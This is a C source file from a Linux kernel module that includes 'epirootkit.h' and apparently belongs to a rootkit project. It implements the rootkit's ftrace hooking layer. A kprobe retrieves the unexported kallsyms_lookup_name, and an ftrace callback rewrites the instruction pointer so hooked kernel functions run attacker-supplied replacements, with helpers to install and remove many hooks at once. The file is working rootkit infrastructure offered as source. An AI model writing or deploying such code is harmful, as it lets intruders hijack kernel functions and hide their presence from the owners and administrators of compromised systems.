#include "epirootkit.h"

// Function prototypes
unsigned long (*fh_init_kallsyms_lookup(void))(const char *);
int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

/**
 * @brief Retrieve the address of kallsyms_lookup_name via kprobe.
 *
 * This function registers a temporary kprobe on "kallsyms_lookup_name",
 * caches the pointer, and returns it.
 *
 * @return Pointer to kallsyms_lookup_name, or NULL on failure.
 */
unsigned long (*fh_init_kallsyms_lookup(void))(const char *) {
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
    static kallsyms_lookup_name_t fh_kallsyms_lookup_ptr = NULL;
    int ret;
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    if (fh_kallsyms_lookup_ptr)
        return fh_kallsyms_lookup_ptr;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_DEBUG "fh_init_kallsyms_lookup: register_kprobe failed: %d\n", ret);
        return NULL;
    }

    fh_kallsyms_lookup_ptr = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    return fh_kallsyms_lookup_ptr;
}

/**
 * @brief ftrace callback that redirects execution to the hook function.
 *
 * @param ip The instruction pointer.
 * @param parent_ip The parent instruction pointer.
 * @param ops Pointer to ftrace_ops structure.
 * @param regs Pointer to ftrace_regs structure.
 */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs) {
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        ((struct pt_regs *)regs)->ip = (unsigned long)hook->function;
}

/**
 * @brief Install an individual ftrace hook.
 *
 * @param hook Pointer to an ftrace_hook structure.
 * @return 0 on success, or a negative error code on failure.
 */
int fh_install_hook(struct ftrace_hook *hook) {
    int err;
    unsigned long (*kallsyms_lookup)(const char *) = fh_init_kallsyms_lookup();

    if (!kallsyms_lookup) {
        printk(KERN_DEBUG "ftrace_helper: unable to get kallsyms_lookup_name pointer\n");
        return -ENOENT;
    }

    hook->address = kallsyms_lookup(hook->name);
    if (!hook->address) {
        printk(KERN_DEBUG "ftrace_helper: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_DEBUG "ftrace_helper: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "ftrace_helper: register_ftrace_function() failed: %d\n", err);
        return err;
    }
    return 0;
}

/**
 * @brief Remove an individual ftrace hook.
 *
 * @param hook Pointer to an ftrace_hook structure.
 */
void fh_remove_hook(struct ftrace_hook *hook) {
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err)
        ERR_MSG("ftrace_helper: unregister_ftrace_function() failed.\n");
    else
        DBG_MSG("ftrace_helper: unregister_ftrace_function() succeeded\n");

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        ERR_MSG("ftrace_helper: ftrace_set_filter_ip() failed. \n");
    else
        DBG_MSG("ftrace_helper: ftrace_set_filter_ip() succeeded\n");
}

/**
 * @brief Install multiple ftrace hooks.
 *
 * @param hooks Pointer to an array of ftrace_hook structures.
 * @param count Number of hooks in the array.
 * @return 0 on success, or a negative error code on failure.
 */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
    int err;
    size_t i;
    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err) {
            while (i--)
                fh_remove_hook(&hooks[i]);
            return err;
        }
    }
    return 0;
}

/**
 * @brief Remove multiple ftrace hooks.
 *
 * @param hooks Pointer to an array of ftrace_hook structures.
 * @param count Number of hooks in the array.
 */
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}